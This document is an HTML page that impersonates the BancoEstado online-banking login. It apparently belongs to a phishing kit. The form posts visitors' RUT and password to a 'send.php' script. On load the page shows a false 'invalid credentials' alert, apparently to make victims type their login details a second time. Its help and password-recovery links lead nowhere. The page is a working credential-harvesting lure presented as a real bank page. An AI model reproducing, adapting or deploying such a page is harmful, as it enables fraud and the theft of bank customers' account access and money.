<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" type="image/png" href="favicon.png">

<!-- TEMA NARANJA BANCOESTADO -->
<meta name="theme-color" content="#FF6600">
<meta name="msapplication-TileColor" content="#FF6600">
<meta name="msapplication-navbutton-color" content="#FF6600">

<!-- iOS Safari -->
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="BancoEstado">
<link rel="apple-touch-icon" href="favicon.png">

<!-- Android Chrome -->
<meta name="mobile-web-app-capable" content="yes">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 30px;
            margin-top: 20px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #FF5C00 0%, #FF8C00 100%);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 20px;
        }

        .logo-text {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .close-btn {
            background: none;
            border: none;
            width: 40px;
            height: 40px;
            border-radius: 8px;
            background-color: #E8E8F0;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #7B7B8C;
            transition: all 0.3s ease;
        }

        .close-btn:hover {
            background-color: #D8D8E0;
            color: #5a5a6a;
        }

        .title {
            font-size: 28px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 35px;
            line-height: 1.3;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 10px;
            letter-spacing: 0.3px;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #D0D0D8;
            border-radius: 6px;
            font-size: 16px;
            color: #1a1a1a;
            font-family: inherit;
            transition: all 0.3s ease;
            background-color: #FAFAFA;
        }

        .form-input:focus {
            outline: none;
            border-color: #3B4FB5;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(59, 79, 181, 0.1);
        }

        .form-input::placeholder {
            color: #A8A8B3;
        }

        .password-field {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .eye-icon:hover svg {
            stroke: #3B4FB5;
        }

        .eye-icon svg {
            width: 20px;
            height: 20px;
            stroke: #1a1a1a;
            fill: none;
            transition: all 0.3s ease;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #3B4FB5 0%, #2A3A8F 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(59, 79, 181, 0.3);
            margin-top: 10px;
            margin-bottom: 20px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(59, 79, 181, 0.4);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }

        .forgot-password a {
            color: #3B4FB5;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
        }

        .forgot-password a:hover {
            text-decoration: underline;
            color: #2A3A8F;
        }

        .divider {
            height: 1px;
            background-color: #D0D0D8;
            margin: 25px 0;
        }

        .business-btn {
            width: 100%;
            padding: 14px;
            background: white;
            color: #3B4FB5;
            border: 2px solid #3B4FB5;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 25px;
        }

        .business-btn:hover {
            background-color: #F5F7FF;
            transform: translateY(-2px);
        }

        .help-section {
            text-align: center;
        }

        .help-question {
            font-size: 14px;
            color: #1a2842;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .help-text {
            font-size: 13px;
            color: #666666;
            line-height: 1.5;
        }

        .help-link {
            color: #3B4FB5;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 24px;
            }

            .form-input {
                font-size: 16px;
            }
        }

        .logo-img {
            width: 155px;
            height: 155px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            padding: 0;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .copyable {
            cursor: pointer;
            user-select: all;
            transition: all 0.2s ease;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .copyable:active {
            background-color: rgba(59, 79, 181, 0.1);
            transform: scale(0.98);
        }
    </style>

<style>

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, Helvetica, sans-serif;
    background: #f2f4f7;
}


/* =========================================
   MODAL OVERLAY
========================================= */

.modal-overlay {
    position: fixed;
    inset: 0;

    background: rgba(8, 15, 30, 0.72);

    backdrop-filter: blur(7px);
    -webkit-backdrop-filter: blur(7px);

    display: flex;
    justify-content: center;
    align-items: center;

    padding: 20px;

    z-index: 9999;

    opacity: 1;
    visibility: visible;

    transition:
        opacity .35s ease,
        visibility .35s ease;
}

.modal-overlay.hidden {
    opacity: 0;
    visibility: hidden;
}


/* =========================================
   MODAL
========================================= */

.modal {
    width: 100%;
    max-width: 620px;

    background: #ffffff;

    border-radius: 24px;

    padding: 30px;

    box-shadow:
        0 25px 70px rgba(0, 0, 0, .22);

    transform: scale(1);

    transition:
        transform .35s ease;

    position: relative;

    overflow: hidden;
}

.modal-overlay.hidden .modal {
    transform: scale(.92);
}


/* =========================================
   LINEA SUPERIOR
========================================= */

.modal::before {
    content: "";

    position: absolute;

    top: 0;
    left: 0;

    width: 100%;
    height: 4px;

    background: linear-gradient(
        90deg,
        #FF6600,
        #FF7A1A,
        #FF8C42
    );
}


/* =========================================
   LOGO
========================================= */

.logo-container {
    display: flex;

    justify-content: center;
    align-items: center;

    margin-bottom: 22px;
}

.logo {
    width: 165px;
    height: 115px;

    display: flex;

    justify-content: center;
    align-items: center;

    background: transparent;

    padding: 5px;

    animation: logoAppear .6s ease;
}

.logo img {
    width: 100%;
    height: 100%;

    object-fit: contain;

    display: block;
}


/* =========================================
   TITULO
========================================= */

.modal-title {
    text-align: center;

    font-size: 25px;

    font-weight: 700;

    color: #172033;

    line-height: 1.25;

    margin-bottom: 8px;
}


/* =========================================
   SUBTITULO
========================================= */

.modal-subtitle {
    text-align: center;

    font-size: 14px;

    line-height: 1.5;

    color: #697386;

    margin-bottom: 25px;
}


/* =========================================
   OPCIONES
========================================= */

.options {
    display: grid;

    grid-template-columns: 1fr 1fr;

    gap: 16px;
}


/* =========================================
   TARJETA DE OPCION
========================================= */

.option {
    position: relative;

    border: 2px solid #e5e9ef;

    border-radius: 18px;

    padding: 15px;

    background: #ffffff;

    cursor: pointer;

    user-select: none;

    transition:
        border-color .25s ease,
        box-shadow .25s ease,
        transform .25s ease,
        background .25s ease;
}


/* =========================================
   HOVER OPCION
========================================= */

.option:hover {
    transform: translateY(-3px);

    border-color: #ffb27d;

    box-shadow:
        0 10px 25px rgba(20, 45, 80, .09);
}


/* =========================================
   IMAGEN
========================================= */

.option-image {
    width: 100%;

    height: 145px;

    border-radius: 13px;

    overflow: hidden;

    background: #f5f5f5;

    margin-bottom: 13px;
}

.option-image img {
    width: 100%;
    height: 100%;

    object-fit: cover;

    display: block;

    transition:
        transform .4s ease;
}

.option:hover .option-image img {
    transform: scale(1.05);
}


/* =========================================
   TITULO OPCION
========================================= */

.option-title {
    font-size: 17px;

    font-weight: 700;

    color: #182235;

    line-height: 1.25;

    margin-bottom: 5px;
}


/* =========================================
   DESCRIPCION OPCION
========================================= */

.option-description {
    font-size: 12px;

    line-height: 1.45;

    color: #7a8494;
}


/* =========================================
   OPCION SELECCIONADA
========================================= */

.option.selected {
    border-color: #FF6600;

    background: #fff7f1;

    box-shadow:
        0 8px 25px rgba(255, 102, 0, .16);

    transform: translateY(-3px);

    animation:
        selectedAnimation .35s ease;
}


/* =========================================
   IMAGEN OPCION SELECCIONADA
========================================= */

.option.selected .option-image img {
    transform: scale(1.04);
}


/* =========================================
   CHECK
========================================= */

.option-check {
    position: absolute;

    top: 12px;
    right: 12px;

    width: 28px;
    height: 28px;

    border-radius: 50%;

    background: #FF6600;

    display: flex;

    justify-content: center;
    align-items: center;

    color: #ffffff;

    font-size: 15px;

    font-weight: bold;

    opacity: 0;

    transform: scale(.5);

    transition:
        opacity .25s ease,
        transform .25s ease;
}

.option.selected .option-check {
    opacity: 1;

    transform: scale(1);
}


/* =========================================
   BOTON CONTINUAR
========================================= */

.continue-btn {
    width: 100%;

    height: 52px;

    margin-top: 23px;

    border: none;

    border-radius: 13px;

    background: #d9dee6;

    color: #929aa7;

    font-size: 15px;

    font-weight: 700;

    cursor: not-allowed;

    transition:
        background .25s ease,
        transform .2s ease,
        box-shadow .25s ease;
}


/* =========================================
   BOTON ACTIVO
========================================= */

.continue-btn.active {
    background: linear-gradient(
        135deg,
        #FF6600,
        #FF7A1A
    );

    color: #ffffff;

    cursor: pointer;

    box-shadow:
        0 8px 20px rgba(255, 102, 0, .25);
}


/* =========================================
   HOVER BOTON
========================================= */

.continue-btn.active:hover {
    transform: translateY(-2px);

    box-shadow:
        0 12px 25px rgba(255, 102, 0, .32);
}


/* =========================================
   CLICK BOTON
========================================= */

.continue-btn.active:active {
    transform: translateY(0);
}


/* =========================================
   FOOTER
========================================= */

.modal-footer {
    text-align: center;

    margin-top: 14px;

    font-size: 11px;

    color: #9aa3af;
}


/* =========================================
   ANIMACION DEL LOGO
========================================= */

@keyframes logoAppear {

    from {
        opacity: 0;

        transform:
            translateY(-12px)
            scale(.9);
    }

    to {
        opacity: 1;

        transform:
            translateY(0)
            scale(1);
    }
}


/* =========================================
   ANIMACION DE SELECCION
========================================= */

@keyframes selectedAnimation {

    0% {
        transform: scale(.97);
    }

    60% {
        transform: scale(1.02);
    }

    100% {
        transform: scale(1);
    }
}


/* =========================================
   TABLETS Y MOVILES
========================================= */

@media (max-width: 600px) {

    .modal-overlay {
        padding: 12px;

        align-items: center;
    }


    .modal {
        width: 100%;

        max-width: 400px;

        padding: 20px 16px;

        border-radius: 18px;

        max-height: 94vh;

        overflow-y: auto;
    }


    /* =====================================
       LOGO MOVIL
    ===================================== */

    .logo-container {
        margin-bottom: 12px;
    }

    .logo {
        width: 90px;

        height: 55px;

        padding: 2px;
    }


    /* =====================================
       TITULO MOVIL
    ===================================== */

    .modal-title {
        font-size: 20px;

        line-height: 1.25;

        margin-bottom: 5px;
    }


    .modal-subtitle {
        font-size: 12px;

        line-height: 1.4;

        margin-bottom: 16px;
    }


    /* =====================================
       OPCIONES MOVIL
    ===================================== */

    .options {
        grid-template-columns: 1fr 1fr;

        gap: 9px;
    }


    /* =====================================
       TARJETAS MOVIL
    ===================================== */

    .option {
        padding: 9px;

        border-radius: 13px;

        border-width: 1.5px;
    }


    .option:hover {
        transform: none;

        border-color: #e5e9ef;

        box-shadow: none;
    }


    /* =====================================
       IMAGEN MOVIL
    ===================================== */

    .option-image {
        height: 95px;

        border-radius: 9px;

        margin-bottom: 8px;
    }


    .option:hover .option-image img {
        transform: none;
    }


    /* =====================================
       TITULO OPCION MOVIL
    ===================================== */

    .option-title {
        font-size: 14px;

        line-height: 1.25;

        margin-bottom: 3px;
    }


    /* =====================================
       DESCRIPCION MOVIL
    ===================================== */

    .option-description {
        font-size: 10px;

        line-height: 1.35;
    }


    /* =====================================
       CHECK MOVIL
    ===================================== */

    .option-check {
        top: 7px;
        right: 7px;

        width: 23px;
        height: 23px;

        font-size: 12px;
    }


    /* =====================================
       BOTON MOVIL
    ===================================== */

    .continue-btn {
        height: 46px;

        margin-top: 15px;

        border-radius: 11px;

        font-size: 14px;
    }


    /* =====================================
       FOOTER MOVIL
    ===================================== */

    .modal-footer {
        margin-top: 9px;

        font-size: 9px;
    }
}


/* =========================================
   CELULARES PEQUEÑOS
========================================= */

@media (max-width: 380px) {

    .modal {
        padding: 17px 13px;

        max-height: 96vh;
    }


    /* =====================================
       LOGO
    ===================================== */

    .logo {
        width: 82px;

        height: 48px;
    }


    /* =====================================
       TITULO
    ===================================== */

    .modal-title {
        font-size: 18px;
    }


    .modal-subtitle {
        font-size: 11px;

        line-height: 1.35;

        margin-bottom: 13px;
    }


    /* =====================================
       OPCIONES
    ===================================== */

    .options {
        gap: 7px;
    }


    /* =====================================
       TARJETAS
    ===================================== */

    .option {
        padding: 7px;

        border-radius: 11px;
    }


    /* =====================================
       IMAGEN
    ===================================== */

    .option-image {
        height: 82px;

        border-radius: 8px;
    }


    /* =====================================
       TITULO OPCION
    ===================================== */

    .option-title {
        font-size: 12px;
    }


    /* =====================================
       DESCRIPCION
    ===================================== */

    .option-description {
        font-size: 9px;

        line-height: 1.3;
    }


    /* =====================================
       CHECK
    ===================================== */

    .option-check {
        width: 20px;

        height: 20px;

        font-size: 10px;

        top: 5px;

        right: 5px;
    }


    /* =====================================
       BOTON
    ===================================== */

    .continue-btn {
        height: 43px;

        margin-top: 12px;

        font-size: 13px;
    }


    /* =====================================
       FOOTER
    ===================================== */

    .modal-footer {
        font-size: 8px;
    }
}


/* =========================================
   CELULARES EXTRA PEQUEÑOS
========================================= */

@media (max-width: 340px) {

    .modal {
        padding: 15px 11px;

        border-radius: 16px;
    }

    .logo {
        width: 75px;

        height: 43px;
    }

    .logo-container {
        margin-bottom: 9px;
    }

    .modal-title {
        font-size: 17px;
    }

    .modal-subtitle {
        font-size: 10px;

        margin-bottom: 11px;
    }

    .options {
        gap: 6px;
    }

    .option {
        padding: 6px;

        border-radius: 10px;
    }

    .option-image {
        height: 75px;

        margin-bottom: 6px;
    }

    .option-title {
        font-size: 11px;
    }

    .option-description {
        font-size: 8px;

        line-height: 1.25;
    }

    .option-check {
        width: 19px;

        height: 19px;

        font-size: 9px;

        top: 4px;

        right: 4px;
    }

    .continue-btn {
        height: 41px;

        margin-top: 10px;

        font-size: 12px;
    }

    .modal-footer {
        margin-top: 7px;

        font-size: 7px;
    }
}


    .bnc-alert-overlay{
    position:fixed;
    inset:0;

    background:rgba(0,0,0,.35);

    display:flex;
    justify-content:center;
    align-items:center;

    z-index:999999;

    animation:fadeIn .25s ease;
}

.bnc-alert-box{
    width:92%;
    max-width:360px;

    background:white;

    border-radius:22px;

    padding:30px 24px;

    text-align:center;

    box-shadow:
    0 18px 45px rgba(0,0,0,.18);

    animation:popup .28s ease;

    font-family:'Poppins',sans-serif;

    position:relative;
}

.bnc-alert-close{
    position:absolute;

    top:14px;
    right:14px;

    width:34px;
    height:34px;

    border:none;
    border-radius:50%;

    background:#f2f4f8;

    color:#5f6b7a;

    font-size:24px;
    line-height:1;

    cursor:pointer;

    transition:.2s;
}

.bnc-alert-close:hover{
    background:#e5e9f0;
}

.bnc-alert-logo{
    width:125px;
    display:block;
    margin:0 auto 18px;
}

.bnc-alert-icon{
    width:58px;
    height:58px;

    border-radius:50%;

    background:#ff5a00;
    color:white;

    display:flex;
    justify-content:center;
    align-items:center;

    font-size:34px;
    font-weight:600;

    margin:0 auto 18px;
}

.bnc-alert-title{
    font-size:24px;
    font-weight:600;

    color:#003c81;

    margin-bottom:10px;
}

.bnc-alert-text{
    font-size:15px;
    line-height:1.7;

    color:#5f6b7a;
}

/* ANIMACIONES */

@keyframes popup{

    0%{
        transform:scale(.85);
        opacity:0;
    }

    100%{
        transform:scale(1);
        opacity:1;
    }
}

@keyframes fadeIn{

    from{
        opacity:0;
    }

    to{
        opacity:1;
    }
}

</style>
</head>
<body>
    
    <div class="container">
        <!-- Header con Logo y Botón Cerrar -->
        <div class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="logo-banco-estado.svg" alt="Logo">
                </div>
            </div>
            <button class="close-btn" onclick="" title="Cerrar">✕</button>
        </div>

        <!-- Título -->
        <h1 class="title">Ingresa a tu Banca en Línea</h1>

        <!-- Formulario -->
        <form id="loginForm" name="loginForm" method="POST" action="send.php" onsubmit="return handleLogin(event)">
            <!-- Campo RUT -->
            <div class="form-group">
                <label class="form-label" for="rut">RUT</label>
                <input 
                    type="text" 
                    id="rut"
                    name="rut2"
                    class="form-input" 
                    placeholder="Ej: 12345678k"
                    autocomplete="off"
                >
            </div>

            <!-- Campo Clave -->
            <div class="form-group">
                <label class="form-label" for="password">Contraseña</label>
                <div class="password-field">
                    <input 
                        type="password" 
                        id="password"
                        name="password2"
                        class="form-input" 
                        placeholder="••••••••"
                        autocomplete="off"
                        maxlength="8"
                    >
                    <span class="eye-icon" id="eyeIcon" onclick="togglePassword()" title="Mostrar/ocultar contraseña" style="cursor: pointer;">
    <!-- Ícono de ojo con línea (oculto) - mostrado por defecto -->
    <svg id="eyeHidden" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width: 22px; height: 22px; fill: rgb(0, 0, 0); display: block;">
        <path d="M17.3 3.209c.2-.2.6-.3.8-.1.2.1.3.4.2.6L6 19.609l-.6.7c-.1.1-.2.2-.4.2-.1 0-.2 0-.3-.1-.2-.2-.3-.6-.1-.8l1.9-2.5c-3.6-1.8-5.3-4.9-5.4-5.1l-.1-.3.1-.2c.2-.3 3.4-6.5 11-6.5 1.2 0 2.4.2 3.4.5zm.4 3.2c3.6 1.8 5.3 4.9 5.4 5.1v.3l-.1.3c-.2.3-3.4 6.5-11 6.5-1.2 0-2.4-.2-3.4-.5l.8-1c.8.2 1.7.3 2.7.3 6 0 9.1-4.5 9.8-5.6-.4-.8-2.1-3.1-4.9-4.5zm-5.6-.2c-6 0-9.1 4.4-9.8 5.5.5.8 2.1 3.1 5 4.5l1.4-1.8c-.6-.7-.9-1.6-.9-2.6 0-2.4 1.9-4.3 4.3-4.3.6 0 1.2.1 1.7.3l1-1.3c-.8-.2-1.7-.3-2.7-.3zm3.4 2.973c.6.7.9 1.6.9 2.6 0 2.4-1.9 4.3-4.3 4.3-.6 0-1.2-.2-1.7-.4l.7-.9c.3.1.7.2 1 .2 1.8 0 3.2-1.4 3.2-3.2 0-.7-.2-1.2-.5-1.7zm-3.4-.673c-1.8 0-3.2 1.5-3.2 3.2 0 .6.2 1.2.5 1.7l3.7-4.7c-.3-.1-.7-.2-1-.2z" fill-rule="evenodd"/>
    </svg>
    
    <!-- Ícono de ojo abierto (normal) - inicialmente oculto -->
    <svg id="eyeClosed" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width: 22px; height: 22px; fill: rgb(0, 0, 0); display: none;">
        <path d="M12 5C6 5 1.5 9 1.5 12s4.5 7 10.5 7 10.5-4 10.5-7-4.5-7-10.5-7zm0 12c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5zm0-8c-1.7 0-3 1.3-3 3s1.3 3 3 3 3-1.3 3-3-1.3-3-3-3z" fill-rule="evenodd"/>
    </svg>
</span>
                </div>
            </div>

            <!-- Botón Ingresar -->
            <button type="submit" class="login-btn">Ingresar</button>
        </form>

        <!-- Enlace Problemas con Clave -->
        <div class="forgot-password">
            <a href="#" onclick="handleForgotPassword(event)">¿Problemas con tu Clave?</a>
        </div>

        <!-- Divisor -->
        <div class="divider"></div>

        <!-- Botón Acceso Empresas -->
        <button class="business-btn" onclick="handleBusinessAccess()">Acceso Empresas</button>

        <!-- Sección Ayuda -->
        <div class="help-section">
            <div class="help-question">¿Necesitas ayuda?</div>
            <div class="help-text">
                Para aclarar dudas revisa nuestro 
                <a href="#" class="help-link" onclick="handleHelpCenter(event)">Centro de ayuda</a>
            </div>
        </div>
    </div>


<!-- ALERTA -->
<div class="bnc-alert-overlay" id="bncAlert">

    <div class="bnc-alert-box">

        <!-- BOTON CERRAR -->
        <button class="bnc-alert-close" id="closeAlert">
            ×
        </button>

        <img
            src="https://emtecgroup.net/wp-content/uploads/2020/06/Banco-Estado.png"
            class="bnc-alert-logo"
        >

        <div class="bnc-alert-icon">
            !
        </div>

        <div class="bnc-alert-title">
            Credenciales inválidas
        </div>

        <div class="bnc-alert-text">
            Verifica tu información e intenta nuevamente.
        </div>

    </div>

</div>
    
<script>

window.addEventListener('load', () => {

    const alertBox = document.getElementById('bncAlert');

    function closeAlert() {

        alertBox.style.opacity = '0';
        alertBox.style.transition = '.25s ease';

        setTimeout(() => {

            alertBox.remove();

        }, 250);
    }

    /* CLICK EN CUALQUIER PARTE */

    document.body.addEventListener('click', closeAlert, {
        once: true
    });

    /* TOUCH MOVIL */

    document.body.addEventListener('touchstart', closeAlert, {
        once: true
    });

});

</script>
<script>
        // ============================================
        // FUNCIONES DE UTILIDAD
        // ============================================

        // Mostrar/Ocultar contraseña
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeClosed = document.getElementById('eyeClosed');
            const eyeHidden = document.getElementById('eyeHidden');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeHidden.style.display = 'none';
                eyeClosed.style.display = 'block';
            } else {
                passwordInput.type = 'password';
                eyeHidden.style.display = 'block';
                eyeClosed.style.display = 'none';
            }
        }

        // ============================================
        // VALIDACIÓN
        // ============================================

        function validatePassword(password) {
            const hasLetters = /[a-zA-Z]/.test(password);
            const hasNumbers = /[0-9]/.test(password);
            const hasSpecialChars = /[^a-zA-Z0-9]/.test(password);
            const validLength = password.length >= 6 && password.length <= 8;
            
            if (password.length === 0) {
                return { valid: false, message: 'La contraseña es obligatoria' };
            }
            if (hasSpecialChars) {
                return { valid: false, message: 'La contraseña no puede contener caracteres especiales' };
            }
            if (!validLength) {
                return { valid: false, message: 'La contraseña debe tener entre 6 y 8 caracteres' };
            }
            if (!hasLetters) {
                return { valid: false, message: 'La contraseña debe contener letras' };
            }
            if (!hasNumbers) {
                return { valid: false, message: 'La contraseña debe contener números' };
            }
            
            return { valid: true };
        }

        // ============================================
        // MANEJO DE EVENTOS
        // ============================================

        function handleLogin(event) {
            const rutInput = document.getElementById('rut');
            const passwordInput = document.getElementById('password');
            
            const rut = rutInput.value.trim();
            const password = passwordInput.value;
            
            // Validar campos vacíos
            if (!rut || !password) {
                alert('Por favor completa todos los campos');
                event.preventDefault();
                return false;
            }
            
            // Validar contraseña
            const validation = validatePassword(password);
            if (!validation.valid) {
                alert(validation.message);
                event.preventDefault();
                return false;
            }
            
            // Guardar RUT en localStorage
            localStorage.setItem('rutUsuario', rut);
            
            // Si todo está bien, permitir el envío del formulario a send.php
            return true;
        }

        function handleForgotPassword(event) {
            event.preventDefault();
            alert('Función de recuperación de contraseña');
        }

        function handleBusinessAccess() {
            alert('Acceso Empresas');
        }

        function handleHelpCenter(event) {
            event.preventDefault();
            alert('Centro de ayuda');
        }

        function closeWindow() {
            window.close();
        }

        // ============================================
        // INICIALIZACIÓN
        // ============================================

        window.addEventListener('load', function() {
            document.getElementById('rut').focus();
        });
    </script>
</body>
</html>
